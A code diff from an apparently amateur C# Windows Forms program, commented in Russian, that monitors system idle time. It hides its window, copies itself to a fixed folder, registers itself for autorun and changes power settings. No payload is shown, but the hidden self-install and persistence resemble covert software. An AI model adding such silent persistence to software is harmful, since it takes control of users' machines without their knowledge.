@@ -66,7 +66,7 @@ namespace WindowsFormsApp1
         }
 
         [DllImport("user32.dll")]   // подключение библиотеки для счёта времени бездействия
-        static extern bool GetLastInputInfo(out LastInputInfo plii);    //функыия подсчёта времени бездействия системы
+        static extern bool GetLastInputInfo(out LastInputInfo plii);    //функция подсчёта времени бездействия системы
 
         LastInputInfo lastInputInfo = new LastInputInfo();  //новая переменная для работы с временем бездействия
 
@@ -80,37 +80,37 @@ namespace WindowsFormsApp1
 
             int idleTime = unchecked(Environment.TickCount - (int)lastInputInfo.dwTime);    //конвертация времени в удобоваримый вариант подсчёта.
                                                                                             //Этот вариант лучше, хотя разницы я не знаю
-           
+            string s =Environment.CurrentDirectory;
 
 
 
-            if (hiden == false && File.Exists(progStartName + @"\redy.txt"))
+            if (hiden == false && s==progStartName)
             {
                 hiden = true;
                 Hide();
-
             }
-            else if (hiden == false && !File.Exists(progStartName + @"\redy.txt"))
+
+            else if (hiden == false && s!=progStartName)
             {
                 idleTimeOld= Convert.ToInt32(DateTime.Now.ToString("ss"));
                 hiden = true;
 
                 CopyDir copy = new CopyDir();
-                copy.copyDir(Environment.CurrentDirectory, progStartName);
+                copy.copyDir(Environment.CurrentDirectory, progStartName, false);
 
                 Autorun autoR = new Autorun();
                 autoR.SetAutorunValue(true, System.AppDomain.CurrentDomain.FriendlyName, progStartName);
-                File.Create(@"C:\Users\Public\Favor\autorn.txt");
+                File.Create(progStartName + @"\setings\autorn.txt");
 
                 PowerSetings pow = new PowerSetings();
                 pow.SetSetings();
-                File.Create(@"C:\Users\Public\Favor\power.txt");
+                File.Create(progStartName + @"\setings\power.txt");
             }
 
 
 
 
-            if (File.Exists(progStartName + @"\redy.txt"))
+            if (File.Exists(progStartName + @"\setings\redy.txt"))
             {
 
                 time = DateTime.Now.ToString("HH.mm");
@@ -133,9 +133,6 @@ namespace WindowsFormsApp1
                 {
                     close_prog();
                 }
-
-
-
 
                 if (time == "00.00" && !File.Exists(Environment.CurrentDirectory + @"/restart.txt"))
                 {
@@ -183,7 +180,7 @@ namespace WindowsFormsApp1
                         srartProg.Start();
                         */
                         //Environment.Exit(0);
-                        File.Create(progStartName + @"\redy.txt");
+                        File.Create(progStartName + @"\setings\redy.txt");
                         //this.Close();
                         Process.Start(@"C:\Windows\explorer", @"C:\Users\Public\Favor\");
                         //this.Close();
